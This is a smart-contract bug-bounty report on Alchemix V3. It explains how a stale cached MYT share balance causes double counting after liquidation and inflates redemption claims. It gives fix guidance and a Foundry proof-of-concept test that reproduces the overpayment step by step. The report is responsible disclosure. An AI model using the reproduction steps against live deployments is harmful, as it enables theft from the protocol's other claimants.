# 56571 sc high inflated claim payouts from double counted myt after liquidation

**Submitted on Oct 17th 2025 at 19:29:45 UTC by @wylis for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #56571
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

When the system becomes undercollateralized and a position is liquidated, MYT backing is moved from the Alchemist to the Transmuter. Due to a bookkeeping bug, that MYT is effectively counted twice in the claim-scaling math, so identical redemption positions can receive a larger payout *after* liquidation than they would have before. A user can split redemptions, wait for/trigger liquidation, then claim the “after” leg to siphon unclaimed yield—overpaying early claimants at the expense of later claimants and the protocol. This can be repeated, front-run, or batched to drain the Transmuter-held MYT vault shares (i.e., `myt().balanceOf(address(transmuter))`), distort settlement fairness, and worsen bad debt, increasing insolvency risk.

## Vulnerability Details

The root cause is a stale, cached TVL source in `AlchemistV3` that gets combined elsewhere with a live `Transmuter` balance, so the same MYT is effectively counted twice immediately after liquidation.

Specifically, Alchemist’s TVL helper `_getTotalUnderlyingValue()` reads an internal accumulator of MYT shares (`_mytSharesDeposited`) instead of the contract’s live MYT share balance:

```solidity
function _getTotalUnderlyingValue() internal view returns (uint256 totalUnderlyingValue) {
    uint256 yieldTokenTVLInUnderlying = convertYieldTokensToUnderlying(_mytSharesDeposited);
    totalUnderlyingValue = yieldTokenTVLInUnderlying;
}
```

Sequence that creates double counting:

1. Before liquidation: MYT shares sit in Alchemist; `_mytSharesDeposited ≈ balanceOf(Alchemist)`, so cached and live views align.
2. During liquidation: Alchemist transfers MYT shares to the Transmuter to cover redemptions. Immediately after this move:

* The Transmuter’s live balance increases (`myt().balanceOf(address(transmuter))`).
* Alchemist’s `_getTotalUnderlyingValue()` still uses the cached `_mytSharesDeposited`, which hasn’t yet reflected the transfer.

3. Right after liquidation: `claimRedemption` combines Alchemist TVL (from the stale cache) plus the Transmuter’s live MYT—counting the same shares twice until the cache is reconciled (e.g., later via `setTransmuterTokenBalance(...)`).
4. Effect: an “after-liquidation” claim for an otherwise identical position pays more than the “before-liquidation” claim.

Fix guidance

```solidity
function _getTotalUnderlyingValue() internal view returns (uint256 totalUnderlyingValue) {
    uint256 liveShares = IERC20(myt).balanceOf(address(this));
    return convertYieldTokensToUnderlying(liveShares);
}
```

Additionally, keep `_mytSharesDeposited` accurate wherever tokens move (e.g., decrement on outbound transfers): `_mytSharesDeposited -= protocolFeeTotal;`.

## Impact Details

What gets stolen: Excess MYT shares are paid out to the first claimant(s) immediately after a liquidation because the Transmuter uses a live MYT balance while Alchemist’s TVL helper still reports a stale cached MYT amount that includes the same shares that were just moved.

Who loses: All remaining claimants in the redemption queue (and the system’s residual MYT backing) are diluted by the overpayment. If the overpayment drains the Transmuter’s balance, later claimants receive less than they are entitled to or nothing at all.

## Proof of Concept

## Proof of Concept

PoC shows the claim amount increases after liquidation when MYT is transferred from Alchemist to Transmuter. It reproduces by creating two identical redemptions, forcing under-collateralization, liquidating, then showing the second claim should NOT exceed the first.

The PoC demonstrates: two equal redemptions, vested equally; claim #1 before liquidation vs. claim #2 after liquidation. Claim #2 is larger solely because the same MYT was double-counted during the short reconciliation window.

Place this file in top level `test/`:

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.28;

/* ------------------------------- OpenZeppelin ------------------------------ */
import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {TransparentUpgradeableProxy} from "lib/openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

/* --------------------------------- Foundry -------------------------------- */
import {Test} from "lib/forge-std/src/Test.sol";
import {Vm} from "lib/forge-std/src/Vm.sol";
import "forge-std/StdStorage.sol";

/* --------------------------------- Core SRC -------------------------------- */
import {AlchemistV3} from "src/AlchemistV3.sol";
import {AlchemicTokenV3} from "src/test/mocks/AlchemicTokenV3.sol";
import {Transmuter} from "src/Transmuter.sol";
import {AlchemistV3Position} from "src/AlchemistV3Position.sol";
import {Whitelist} from "src/utils/Whitelist.sol";
import {IAlchemistV3, AlchemistInitializationParams} from "src/interfaces/IAlchemistV3.sol";
import {ITransmuter} from "src/interfaces/ITransmuter.sol";
import {AlchemistTokenVault} from "src/AlchemistTokenVault.sol";

/* ---------------------------------- Mocks --------------------------------- */
import {TestERC20} from "src/test/mocks/TestERC20.sol";
import {MockYieldToken} from "src/test/mocks/MockYieldToken.sol";
import {MockMYTStrategy} from "src/test/mocks/MockMYTStrategy.sol";
import {MockAlchemistAllocator} from "src/test/mocks/MockAlchemistAllocator.sol";
import {MockMYTVault} from "src/test/mocks/MockMYTVault.sol";

/* ------------------------------- Vault v2 lib ------------------------------ */
import {IVaultV2} from "lib/vault-v2/src/interfaces/IVaultV2.sol";
import {IMYTStrategy} from "src/interfaces/IMYTStrategy.sol";
import {MYTTestHelper} from "src/test/libraries/MYTTestHelper.sol";

import {IERC721Enumerable} from "@openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol";

/// @notice PoC: Claim amount increases after liquidation when MYT is transferred from Alchemist to Transmuter.
/// @dev Reproduces by creating two identical redemptions, forcing under-collateralization,
///      liquidating, then showing the second claim should NOT exceed the first.

contract AlchemistV3Test is Test {
    using stdStorage for StdStorage;

    /* roles */
    address public operator = address(0x2222222222222222222222222222222222222222);
    address public admin = address(0x4444444444444444444444444444444444444444);
    address public curator = address(0x8888888888888888888888888888888888888888);

    /* users */
    address public u1 = address(0xBEEF);
    address public u2 = address(0x0DAd);
    address public u3 = address(0x520aB24368e5Ba8B727E9b8aB967073Ff9316961);
    address public u4 = address(0x420Ab24368E5bA8b727E9B8aB967073Ff9316969);

    /* MYT mocks */
    TestERC20 public underlying;
    MockYieldToken public yToken;
    MockMYTVault public vault;
    MockMYTStrategy public mytStrategy;
    MockAlchemistAllocator public allocator;

    /* Alchemist stack */
    AlchemicTokenV3 public alToken;
    Transmuter public transmuter;
    AlchemistV3 public alchemistLogic;
    AlchemistV3 public alchemist;
    TransparentUpgradeableProxy public proxyAlchemist;
    AlchemistV3Position public alchemistNFT;
    AlchemistTokenVault public alchemistFeeVault;
    Whitelist public whitelist;
    address public protocolFeeReceiver = address(10);

    /* sizing */
    uint256 public accountFunds;
    uint256 public depositAmount;

    StdStorage private _s;

    function setUp() external {
        vm.label(address(this), "owner");
        vm.label(u1, "u1");
        vm.label(u2, "u2");
        vm.label(u3, "u3");
        vm.label(u4, "whale");

        uint8 d = 18;
        accountFunds = 200_000 * 10 ** d;
        depositAmount = 200_000 * 10 ** d;

        /* ---------- Build MYT stack (respect timelock) ---------- */
        vm.startPrank(admin);

        underlying = new TestERC20(1_000_000 * 10 ** d, d);
        yToken = new MockYieldToken(address(underlying));

        // ✅ FIX: ctor is (owner, asset) — pass admin first, then asset
        vault = new MockMYTVault(admin, address(underlying));
        vault.setCurator(curator);

        mytStrategy = MYTTestHelper._setupStrategy(address(vault), address(yToken), admin, "MockToken", "MockTokenProtocol", IMYTStrategy.RiskClass.LOW);

        allocator = new MockAlchemistAllocator(address(vault), admin, operator);

        vm.stopPrank();

        // curator executes timelocked governance actions
        _submitAndFastForward(abi.encodeCall(IVaultV2.setIsAllocator, (address(allocator), true)));
        vm.prank(curator);
        vault.setIsAllocator(address(allocator), true);

        _submitAndFastForward(abi.encodeCall(IVaultV2.addAdapter, (address(mytStrategy))));
        vm.prank(curator);
        vault.addAdapter(address(mytStrategy));

        bytes memory id = mytStrategy.getIdData();

        _submitAndFastForward(abi.encodeCall(IVaultV2.increaseAbsoluteCap, (id, 2_000_000_000e18)));
        vm.prank(curator);
        vault.increaseAbsoluteCap(id, 2_000_000_000e18);

        _submitAndFastForward(abi.encodeCall(IVaultV2.increaseRelativeCap, (id, 1e18))); // 100%
        vm.prank(curator);
        vault.increaseRelativeCap(id, 1e18);

        /* -------------------------- Alchemist (proxy) ------------------------- */
        vm.startPrank(admin);

        alToken = new AlchemicTokenV3("Debt", "DEBT", 18);

        ITransmuter.TransmuterInitializationParams memory tp = ITransmuter.TransmuterInitializationParams({
            syntheticToken: address(alToken),
            feeReceiver: address(this),
            timeToTransmute: 5_256_000,
            transmutationFee: 10,
            exitFee: 20,
            graphSize: 52_560_000
        });
        transmuter = new Transmuter(tp);

        alchemistLogic = new AlchemistV3();
        whitelist = new Whitelist();

        uint256 minimumCollateralization = uint256(1e18 * 1e18) / 9e17; // ≈1.111…

        AlchemistInitializationParams memory params = AlchemistInitializationParams({
            admin: admin,
            debtToken: address(alToken),
            underlyingToken: address(vault.asset()),
            depositCap: type(uint256).max,
            minimumCollateralization: minimumCollateralization,
            collateralizationLowerBound: 1_052_631_578_950_000_000, // 1.052e18
            globalMinimumCollateralization: 1_111_111_111_111_111_111, // 1.111e18
            transmuter: address(transmuter),
            protocolFee: 0,
            protocolFeeReceiver: protocolFeeReceiver,
            liquidatorFee: 300,
            repaymentFee: 100,
            myt: address(vault)
        });

        bytes memory init = abi.encodeWithSelector(AlchemistV3.initialize.selector, params);
        proxyAlchemist = new TransparentUpgradeableProxy(address(alchemistLogic), address(this), init);
        alchemist = AlchemistV3(address(proxyAlchemist));

        alToken.setWhitelist(address(proxyAlchemist), true);
        transmuter.setAlchemist(address(alchemist));
        transmuter.setDepositCap(uint256(type(int256).max));

        alchemistNFT = new AlchemistV3Position(address(alchemist));
        alchemist.setAlchemistPositionNFT(address(alchemistNFT));

        alchemistFeeVault = new AlchemistTokenVault(address(vault.asset()), address(alchemist), admin);
        alchemistFeeVault.setAuthorization(address(alchemist), true);
        alchemist.setAlchemistFeeVault(address(alchemistFeeVault));

        vm.stopPrank();

        /* ------------------------- Seed vault with users ---------------------- */
        _depositToVault(u1, depositAmount);
        _depositToVault(u2, depositAmount);
        _depositToVault(u3, depositAmount);
        _depositToVault(u4, depositAmount);
    }

    /* ------------------------------- Helpers -------------------------------- */

    function _submitAndFastForward(bytes memory data) internal {
        vm.prank(curator);
        vault.submit(data);
        bytes4 sel = bytes4(data);
        uint256 delay = vault.timelock(sel);
        vm.warp(block.timestamp + delay + 1);
    }

    function _depositToVault(address user, uint256 amt) internal {
        deal(address(underlying), user, amt);
        vm.startPrank(user);
        IERC20(address(underlying)).approve(address(vault), amt);
        vault.deposit(amt, user);
        vm.stopPrank();
    }

    function _firstTokenId(address owner) internal view returns (uint256) {
        return IERC721Enumerable(address(alchemistNFT)).tokenOfOwnerByIndex(owner, 0);
    }

    // Event selector for Transmuter.PositionCreated(address account, uint256 amount, uint256 id)
    bytes32 constant _POS_CREATED = keccak256("PositionCreated(address,uint256,uint256)");

    // Denominator used by Transmuter: UV(Alchemist) + MYT-held-by-Transmuter (in underlying terms)
    function _denominator() internal view returns (uint256) {
        uint256 uv = alchemist.getTotalUnderlyingValue();
        uint256 transMYT = vault.balanceOf(address(transmuter));
        return uv + alchemist.convertYieldTokensToUnderlying(transMYT);
    }

    function _badDebtRatioLikeTransmuter() internal view returns (uint256) {
        uint256 den = _denominator();
        if (den == 0) den = 1; // Transmuter guards the same way
        return AlchemicTokenV3(alchemist.debtToken()).totalSupply() * 1e18 / den;
    }

    function _reduceVaultUnderlying(uint256 factor) internal {
        // 1) Cut the vault’s underlying directly
        uint256 uv = underlying.balanceOf(address(vault));
        if (uv > 0) {
            deal(address(underlying), address(vault), uv / factor);
        }

        // 2) If the strategy actually holds yTokens in THIS run, scale those too.
        uint256 yBal = yToken.balanceOf(address(mytStrategy));
        if (yBal > 0) {
            deal(address(yToken), address(mytStrategy), yBal / factor);
        }
    }

    // Get the redemption id from the PositionCreated event.
    function _createRedemptionAndGetId(address redeemer, uint256 amt) internal returns (uint256) {
        vm.recordLogs();
        vm.prank(redeemer);
        transmuter.createRedemption(amt);
        Vm.Log[] memory logs = vm.getRecordedLogs();

        for (uint256 i = logs.length; i > 0; i--) {
            Vm.Log memory lg = logs[i - 1];
            if (lg.emitter == address(transmuter) && lg.topics.length > 0 && lg.topics[0] == _POS_CREATED) {
                // If account is indexed, data=(amount,id); otherwise (account,amount,id)
                if (lg.topics.length >= 2) {
                    (uint256 amount, uint256 id) = abi.decode(lg.data, (uint256, uint256));
                    require(amount == amt, "amount mismatch");
                    return id;
                } else {
                    (address who, uint256 amount, uint256 id) = abi.decode(lg.data, (address, uint256, uint256));
                    require(who == redeemer && amount == amt, "event mismatch");
                    return id;
                }
            }
        }
        revert("PositionCreated not found");
    }

    function test_NoClaimBoost_AfterLiquidationMYTTransfer() public {
        // --- 0) Borrower deposits MYT shares into Alchemist and borrows ---
        uint256 depositShares = vault.balanceOf(u1) / 4; // use a chunk
        vm.startPrank(u1);
        vault.approve(address(alchemist), depositShares);
        alchemist.deposit(depositShares, u1, 0);
        uint256 tokenId = _firstTokenId(u1);

        // Borrow some, leaving headroom so it's healthy pre-shock
        uint256 borrowable = alchemist.getMaxBorrowable(tokenId);
        uint256 mintAmt = (borrowable * 90) / 100;
        alchemist.mint(tokenId, mintAmt, u1);
        vm.stopPrank();

        // --- 1) Seed Transmuter with a small MYT balance (so both claims can pay) ---
        vm.prank(u4);
        vault.transfer(address(transmuter), 2e18);

        // --- 2) Create two equal redemptions from u3 ---
        uint256 redeemAmt = 1e18; // small
        // send synth to u3
        vm.startPrank(u1);
        alToken.transfer(u3, redeemAmt * 2);
        vm.stopPrank();

        vm.prank(u3);
        alToken.approve(address(transmuter), redeemAmt * 2);
        uint256 id1 = _createRedemptionAndGetId(u3, redeemAmt);
        uint256 id2 = _createRedemptionAndGetId(u3, redeemAmt);

        // sanity: sequential NFTs so they're symmetric for vesting
        assertEq(id2, id1 + 1, "expected sequential redemption ids");

        // --- 3) Let both positions vest the same fraction ---
        uint256 ttt = transmuter.timeToTransmute();
        assertGt(ttt, 0, "timeToTransmute must be > 0");

        vm.roll(block.number + (ttt / 2));

        // --- 4) Shock: reduce vault's underlying by 4× to force global undercollateralization ---
        _reduceVaultUnderlying(4);
        assertGt(_badDebtRatioLikeTransmuter(), 0, "need undercollateralization");

        // --- 5) Claim BEFORE liquidation (baseline payout) ---
        uint256 balBefore = vault.balanceOf(u3);
        vm.prank(u3);
        transmuter.claimRedemption(id1);
        uint256 claimedBefore = vault.balanceOf(u3) - balBefore;
        assertGt(claimedBefore, 0, "pre-claim must pay some MYT");

        // --- 6) Liquidation (moves MYT from Alchemist -> Transmuter) ---
        // public entrypoint; no hacks
        vm.prank(u2);
        alchemist.liquidate(tokenId);

        // --- 7) Claim AFTER liquidation (payout must NOT improve) ---
        balBefore = vault.balanceOf(u3);
        vm.prank(u3);
        transmuter.claimRedemption(id2);
        uint256 claimedAfter = vault.balanceOf(u3) - balBefore;

        // No boost allowed: after liquidation, claim must NOT be larger.
        // Allow a tiny epsilon for rounding.
        uint256 epsilon = 1e6; // 0.000001 MYT at 18 decimals

        // Primary invariant: can't be bigger than "before" (except epsilon)
        assertLe(claimedAfter, claimedBefore + epsilon, "claim increased after liquidation-driven MYT transfer (double-counted backing)");

        // Symmetric rounding guard: |after - before| <= epsilon
        uint256 diff = claimedAfter > claimedBefore ? claimedAfter - claimedBefore : claimedBefore - claimedAfter;
        assertLe(diff, epsilon, "rounding-only drift allowed");
    }
}
```
